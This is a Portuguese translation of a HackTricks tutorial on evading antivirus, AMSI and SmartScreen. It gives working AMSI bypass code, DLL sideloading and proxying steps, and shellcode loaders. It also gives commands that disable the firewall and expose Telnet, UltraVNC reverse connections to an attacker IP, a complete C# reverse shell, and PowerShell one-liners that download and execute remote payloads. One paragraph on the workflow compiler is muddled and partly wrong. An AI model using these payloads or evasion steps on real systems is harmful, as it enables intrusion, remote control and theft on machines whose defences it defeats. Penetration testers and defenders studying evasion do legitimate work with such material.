# Bypass de Antivírus (AV)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página foi escrita por** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não, detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é alcançada marcando strings ou matrizes de bytes maliciosas conhecidas em um binário ou script e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que o uso de ferramentas públicas conhecidas pode ser detectado com mais facilidade, pois provavelmente foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

* **Criptografia**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de carregador para descriptografar e executar o programa na memória.

* **Ofuscação**

Às vezes, tudo o que você precisa fazer é alterar algumas strings em seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

* **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.

{% hint style="info" %}
Uma boa maneira de verificar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e, em seguida, solicita que o Defender verifique cada um individualmente, dessa forma, ele pode informar exatamente quais são as strings ou bytes marcados em seu binário.
{% endhint %}

Eu recomendo muito que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa a atividade maliciosa (por exemplo, tentando descriptografar e ler as senhas do seu navegador, realizando um minidespejo em LSASS, etc.). Essa parte pode ser um pouco mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evitar as sandboxes.

* **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, portanto, o uso de longos atrasos pode perturbar a análise de binários. O problema é que muitas sandboxes AV podem simplesmente ignorar o atraso, dependendo de como ele é implementado.
* **Verificação dos recursos da máquina** Geralmente, as sandboxes têm muito poucos recursos para trabalhar (por exemplo, <2 GB de RAM), caso contrário, elas podem desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado na sandbox.
* **Verificações específicas da máquina** Se você deseja segmentar um usuário cuja estação de trabalho está associada ao domínio "contoso.local", pode verificar o domínio do computador para ver se ele corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o nome do computador em seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do Defender, então você pode fazer seu programa sair.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) para ir contra as Sandboxes

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então, você deve se perguntar algo:

Por exemplo, se você deseja despejar o LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que é menos conhecido e também despeja o LSASS.

A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, é provavelmente um dos, senão o malware mais marcado pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então basta procurar alternativas para o que você está tentando alcançar.

{% hint style="info" %}
Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no defender e, por favor, seriamente, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste-o lá até ficar satisfeito com o resultado.
{% endhint %}

## EXEs vs DLLs

Sempre que possível, **
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Este comando irá listar os programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore os programas DLL Hijackable/Sideloadable por si mesmo**, essa técnica é bastante furtiva se feita corretamente, mas se você usar programas DLL Sideloadable publicamente conhecidos, pode ser facilmente descoberto.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não carregará sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e sendo capaz de lidar com a execução da sua carga útil.

Eu estarei usando o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui: 

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

O último comando nos dará 2 arquivos: um modelo de código-fonte DLL e a DLL renomeada original.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estes são os resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto o proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Eu **recomendo fortemente** que você assista ao VOD do twitch [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também o vídeo do [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender mais sobre o que discutimos com mais profundidade.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um conjunto de ferramentas de payload para contornar EDRs usando processos suspensos, syscalls diretos e métodos de execução alternativos`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
A evasão é apenas um jogo de gato e rato, o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta, se possível, tente encadear várias técnicas de evasão.
{% endhint %}

## AMSI (Interface Anti-Malware Scan)

AMSI foi criado para prevenir "malware sem arquivo". Inicialmente, os AVs eram capazes de escanear apenas **arquivos em disco**, então se você pudesse de alguma forma executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedi-lo, pois não tinha visibilidade suficiente.

O recurso AMSI é integrado a esses componentes do Windows.

* Controle de Conta de Usuário, ou UAC (elevação de instalação EXE, COM, MSI ou ActiveX)
* PowerShell (scripts, uso interativo e avaliação de código dinâmico)
* Windows Script Host (wscript.exe e cscript.exe)
* JavaScript e VBScript
* Macros do Office VBA

Ele permite que as soluções antivírus inspecionem o comportamento do script expondo o conteúdo do script de forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda fomos pegos na memória por causa do AMSI.

Existem algumas maneiras de contornar o AMSI:

* **Ofuscação**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenha várias camadas, então a ofuscação pode ser uma má opção dependendo de como é feita. Isso torna não tão direto para evitar. Embora, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e você estará bem, então depende de quanto algo foi sinalizado.

* **Bypass AMSI**

Como o AMSI é implementado carregando uma DLL no processo powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente, mesmo sendo executado como usuário não privilegiado. Devido a essa falha na implementação do AMSI, os pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçando um erro**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) resultará que nenhuma verificação será iniciada para o processo atual. Originalmente, isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para evitar o uso mais amplo.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi necessário foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi detectada pelo próprio AMSI, então algumas modificações são necessárias para usar essa técnica.

Aqui está um bypass modificado do AMSI que eu peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```
Tenha em mente que isso provavelmente será detectado assim que este post for publicado, então você não deve publicar nenhum código se seu plano é permanecer indetectável.

**Patching de Memória**

Essa técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/\_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código para E\_INVALIDARG, dessa forma, o resultado da varredura real retornará 0, que é interpretado como um resultado limpo.

{% hint style="info" %}
Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.
{% endhint %}

Existem também muitas outras técnicas usadas para contornar o AMSI com o powershell, confira [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) e [este repositório](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

## Ofuscação

Existem várias ferramentas que podem ser usadas para **ofuscar código C# em texto claro**, gerar **modelos de metaprogramação** para compilar binários ou **ofuscar binários compilados** como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto do [LLVM](http://www.llvm.org/) capaz de fornecer segurança de software aumentada por meio de [ofuscação de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) e proteção contra adulteração.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, no momento da compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
* [**obfy**](https://github.com/fritzone/obfy): Adicione uma camada de operações ofuscadas geradas pelo framework de metaprogramação de modelos C++ que tornará a vida da pessoa que deseja quebrar a aplicação um pouco mais difícil.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (programação orientada a retorno). ROPfuscator ofusca um programa no nível de código de montagem, transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um criptografador .NET PE escrito em Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e depois carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicativos baixados incomumente acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais informações -> Executar mesmo assim).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) com o nome de Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, juntamente com a URL de onde foi baixado.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

{% hint style="info" %}
É importante observar que os executáveis assinados com um certificado de assinatura **confiável** não acionarão o SmartScreen.
{% endhint %}

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.

Exemplo de uso:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de como contornar o SmartScreen empacotando payloads dentro de arquivos ISO usando o [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexão de Assembleia C#

Carregar binários C# na memória é conhecido há muito tempo e ainda é uma ótima maneira de executar suas ferramentas pós-exploração sem ser detectado pelo AV.

Uma vez que o payload será carregado diretamente na memória sem tocar no disco, só teremos que nos preocupar em corrigir o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornece a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazê-lo:

* **Fork\&Run**

Isso envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem seus benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo de implante Beacon. Isso significa que se algo em nossa ação pós-exploração der errado ou for detectado, há uma **maior chance** de nosso **implante sobreviver**. A desvantagem é que você tem uma **maior chance** de ser detectado por **Detecções Comportamentais**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Trata-se de injetar o código malicioso de pós-exploração **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazê-lo ser verificado pelo AV, mas a desvantagem é que se algo der errado com a execução do seu payload, há uma **maior chance** de **perder seu beacon** pois ele pode falhar.

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Se você quiser ler mais sobre o carregamento de Assembleias C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e seu BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Você também pode carregar Assembleias C# **do PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando outras linguagens de programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo atacante**.&#x20;

Ao permitir o acesso aos Binários do Interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: O Defender ainda verifica os scripts, mas ao utilizar Go, Java, PHP, etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de shell reverso não ofuscados aleatórios nessas linguagens foram bem-sucedidos.

## Evasão avançada

A evasão é um tópico muito complicado, às vezes você tem que levar em conta muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível ficar completamente indetectável em ambientes maduros.

Cada ambiente contra o qual você vai lutar terá seus próprios pontos fortes e fracos.

Eu recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para ter uma base em técnicas de evasão mais avançadas.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Esta é também outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasão em Profundidade.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas antigas**

### **Servidor Telnet**

Até o Windows10, todos os Windows vinham com um **servidor Telnet** que você poderia instalar (como administrador) fazendo:
```
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet** (stealth) e desativar o firewall:

Para evitar a detecção de um ataque, é possível alterar a porta padrão do serviço Telnet para uma porta diferente. Isso dificulta a detecção do serviço pelos administradores de rede e pelos sistemas de detecção de intrusão. Além disso, desativar o firewall pode permitir que o atacante tenha acesso mais fácil ao sistema alvo.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe-o em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não a instalação)

**NO HOST**: Execute o _**winvnc.exe**_ e configure o servidor:

* Ative a opção _Disable TrayIcon_
* Defina uma senha em _VNC Password_
* Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ dentro do **computador da vítima**

#### **Conexão reversa**

O **atacante** deve **executar dentro** do seu **computador** o binário `vncviewer.exe -listen 5900` para que ele esteja **preparado** para capturar uma conexão reversa do **VNC**. Em seguida, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATENÇÃO:** Para manter o sigilo, você não deve fazer algumas coisas

* Não inicie o `winvnc` se ele já estiver em execução ou você irá acionar um [popup](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
* Não inicie o `winvnc` sem o `UltraVNC.ini` no mesmo diretório ou ele causará a abertura da [janela de configuração](https://i.imgur.com/rfMQWcf.png)
* Não execute `winvnc -h` para obter ajuda ou você irá acionar um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe-o em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o listener** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O atual defensor irá encerrar o processo muito rapidamente.**

### Compilando nosso próprio shell reverso

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro shell reverso em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```
### C# usando compilador

Este método envolve o uso do compilador C# para compilar um código malicioso em um arquivo executável. O arquivo executável pode ser executado em um sistema Windows sem a necessidade de instalar o .NET Framework. O código malicioso é um shell reverso simples que se conecta a um servidor remoto controlado pelo invasor. O compilador C# é usado para compilar o código malicioso em um arquivo executável que pode ser executado em um sistema Windows. O arquivo executável é então enviado para a vítima e executado em seu sistema. O shell reverso é estabelecido e o invasor pode controlar o sistema remotamente.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Download e execução automática:

O objetivo dessa técnica é fazer o download e execução automática de um arquivo malicioso sem que o usuário perceba. Para isso, é utilizado um arquivo REV.txt que contém um script PowerShell que faz o download do arquivo malicioso REV.shell e o executa. O script é executado através do comando "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NoLogo -Command" que permite a execução do script sem que o usuário perceba. É importante ressaltar que essa técnica pode ser detectada por antivírus que possuem proteção contra download e execução automática de arquivos.
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless: 
